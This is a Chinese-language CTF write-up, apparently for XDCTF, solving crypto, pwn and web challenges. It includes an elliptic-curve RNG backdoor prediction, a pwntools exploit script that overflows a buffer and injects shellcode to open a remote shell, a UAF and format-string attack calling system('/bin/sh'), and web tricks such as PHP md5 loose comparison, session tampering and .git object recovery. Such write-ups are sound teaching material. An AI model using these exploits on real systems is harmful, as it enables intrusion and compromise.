    key=newkey
    keydic={}
    doinit(key)
    print "key changed"
    l=len(str)/6
    for i in range(l):
    tmpblk=res[i*6:(i+1)*6]
    if keydic.get(tmpblk)!=None:
    ans[keydic[tmpblk]]=str[i*6:(i+1)*6]
    print keydic[tmpblk],ans[keydic[tmpblk]]
    keydic={}
    ans=[]
    for i in range(78/6):
    ans.append('')
    # test
    '''
    dic['101010']='313233'
    dic['111111']='343536'
    decrypt('101010111111101010')
    exit()
    '''
    key=''
    table=string.ascii_lowercase
    sendstr=''
    sendlen=0
    for b0 in table:
    for b1 in table:
    for b2 in table:
    sendstr+=b0.encode('hex')+b1.encode('hex')+b2.encode('hex')
    sendlen+=6
    if sendlen==180:
    getdic(sendstr)
    sendstr=''
    sendlen=0
    print ans
    print ans
**CRYPT 500**
这题是道椭圆曲线,需要预测产生的下一个随机数,首先nistp256这条曲线是固定的,可以搜到相关的参数。通过观察getrand里面的操作,可知产生的随机数是Q*x在x轴上的值,而下一次使用的x是P*这次的x,因为服务器会返回第一次的随机数,Q以及d,P是曲线的基点是固定的,所以可以令返回的随机数所对应的椭圆曲线点在乘上d的逆元得到下一次使用的x,然后顺推得到下一次的随机数(generate_backdoor里甚至都求了逆元,这是提示么)。
然后怎么从x轴的值反推椭圆曲线的点我卡了快一个白天……
最后好像是搜椭圆曲线基点选取的时候找到了现成的算法,特殊情况下的离散对数问题,二次剩余之类虽然听过不过以前不太熟悉啊。
似乎服务器会等的时间比较久,于是懒得写程序直接用python命令行手动搞,以下是部分命令记录:
    python
    a=0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc
    b=0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b
    p=a+3
    p1=(p+1)/4
curve是曲线
P是基点,不要吐槽跟上面那个p长这么像
    python
    >>> xi=57914131887997596536669874361124734441741601814101568455763547876867316798523
    >>> t=(xi**3+a*xi+b)
    >>> t1=t%p
    >>> pow(t1,p1,p)
    43331064576091791900838480679880237851600469995188036303750484440002321848367L
    >>> d=9673497928745459324013728553516164787612436752039204660069136338836429731578
    >>> Q=seccure.AffinePoint(3529261633757778563782558685806991416222128376163198390623944234947821868434,1227400874056650306347612046180653179066970966812566313338015124847638720935,curve)
    >>> i0=seccure.AffinePoint(57914131887997596536669874361124734441741601814101568455763547876867316798523,43331064576091791900838480679880237851600469995188036303750484440002321848367,curve)
    >>> e=gmpy.invert(gmpy.mpz(d),curve.order)>>> i1=i0*e
    >>> Q*i1.x
**PWN 100**
杀软报毒可发现所给文件的CVE-2012-0158的exploit,用office打开所给恶意RTF文件,触发exp运行,动态调试可发现内存中有`C:flag.txt`字符串,于是发现在此路径有隐藏文件存有flag。
好吧,我知道正解应该是去找到对应的shellcode的地方看……
**PWN 200**
程序很明显的一个栈溢出,无栈cookie,又是32位,参数可直接控制,但是由于没给libc,无法根据泄漏got表计算system的地址。
但是由于程序可以无限次泄漏,且长度不限,即意味着我们完全有能力dump出整个内存,故而肯定可以直接在内存中找到system的地址,简单起见,可以直接使用pwntools中的DynELF。
由于DynELF只能查找库函数地址,故而,查找`/bin/sh`字符串比较麻烦,于是可以选择通过调用read读入到空闲地址。
比较坑的是,做的时候泄漏system地址后,调用system总是无效,但是调用write确能正常输出,在system下断点发现程序确实执行过去并且参数正确,死命的不知道哪里错了,最后在调用system之前,让程序跳到__start恢复栈重新开始程序就可以成功调用system。
**PWN 300**
做题人留下程序赶火车去了 again ……
我就知道他最开始没有 checksec,导致浪费了一天时间……
    python
    from pwn import *
    #c = process('./aa508d1df74d46a88bc02210c7f92824')
    #c = remote('localhost', port = 6666)
    c=remote('133.130.90.210', port=6666)
    print c.recv()
    def mysend(s):
    global c
    z = c.recv()
    #print s
    c.sendline(s)
    #print s
    sleep(0.2)
    for i in range(5):
    mysend('1')
    mysend('0')
    mysend('3')
    mysend('0')
    mysend('1')
    mysend('a'*0x74+p32(0x804b06c)+p32(0x804b064))
    mysend('2')
    mysend('1')
    mysend('3')
    mysend('2')
    mysend('0')
    mysend(p32(0x0804b010) + asm(shellcraft.sh()))
    mysend('3')
    mysend('3')
    mysend('0')
    c.send(p32(0x0804b070))
    sleep(0.1)
    c.interactive()
**PWN 400**
逆向可发现如下一段:
    c
    if ( (unsigned __int16)(file_name_len + 2) essay);
    c
    if ( exam->real_essay_len )
    {
        exam->essay = 0LL;
        exam->real_essay_len = 0;
    }
可以明显看到这两个地方的判断条件是不同的,也就是说,我们只要让 `real_essay_len` 为 0,就可以在 essay 被 free
之后仍旧保留此指针,从而实现 UAF。
而在读入 essay 的时候:
    c
    read_essay_len = 0;
    do
        read_essay_len += read_str(&s[read_essay_len], len - read_essay_len);
    while ( read_essay_len != len );
    fputs(s, stream);
    c
    while ( fread(&ptr[i], 1uLL, 1uLL, stream) )
        ++i;
很明显,这里我们通过输入 `x00`,可以导致 `fputs` 的时候没有写入任何东西到 `stream`,于是接下来 `fread`
的时候就什么也读不到,从而实现 `read_essay_len` 为 0。
UAF 之后,我们让 essay 和一个 exam 的结构体使用同一份内存,通过 cheat,我们可以修改已经 free 的 essay,也即可以修改
exam 的结构体,改写其中的函数指针,从而在 show scores 的时候调用任意函数。
但是,调用函数的时候,参数我们无法控制,只能是以执行这个结构体的指针为第一个参数,由于结构体完全受我们控制,也就是说第一个参数的字符串内容是我们可以控制的,那么只要我们能够知道system的地址,我们就可以调用
`system("/bin/sh")` 了。
为了知道 system 的地址,我们可以构造一个格式化字符串漏洞,即调用 `printf("%11$16lx")`,这样可以将 main 函数的
return address 泄漏,而这个地址在 `__libc_start_main` 中,也即在 libc 中,于是就可以计算 system
地址了,此题得以解决。
PS:据说覆盖子进程的 rbp 也是可以脑洞出一个利用的……
**WEB1 100**
先下载备份文件index.php~,发现是一个被混淆过的php文件,找到个破解网站
http://zhaoyuanma.com/phpjm.php,破解后的源代码提示需要满足 `$test=$_GET['test'];
$test=md5($test); if($test=='0')`
那么md5($test)什么时候会和'0'相等呢?
找到一篇解释 http://stackoverflow.com/questions/22140204/why-md5240610708-is-equal-to-md5qnkcdzo
了解到当使用=='0'做比较时,会将md5字符串转换成数字。那么只要找到能够被转换成0的md5字符串即可。由于240610708的md5值是`0e462097431906509019562988736854`,它可以代表一个浮点数0(因为0e代表科学计数法),那么它和0比较的时候就会相等,于是将240610708作为test的参数,可以获取flag。
## WEB1 200
这道题看源代码就可以知道examples这个目录,但是后来就完全不知道怎么搞了。到了第二天晚上有个同学扫到了改Session的路径,也就是这个http://flagbox-23031374.xdctf.win:1234/examples/servlets/servlet/SessionExample
……
然后就很简单了,把user设成Administrator,pwd随便写,然后登录页面返回了not
login的消息,猜猜,添个login=true的数据,就得到了flag。
**WEB2 200**
首先题目提示了git,进入页面后发现有.git目录,不过403,根据.git目录的惯例爬文件,不过HEAD里面没什么东西,后来看到tag1.0之类的字样,就把refs/tags下面的文件拿来,根据hash去objects里面抓文件,拿来后扔zlib里解压,发现是一个树节点,依次把里面提到的objects都取来后在index页面里发现flag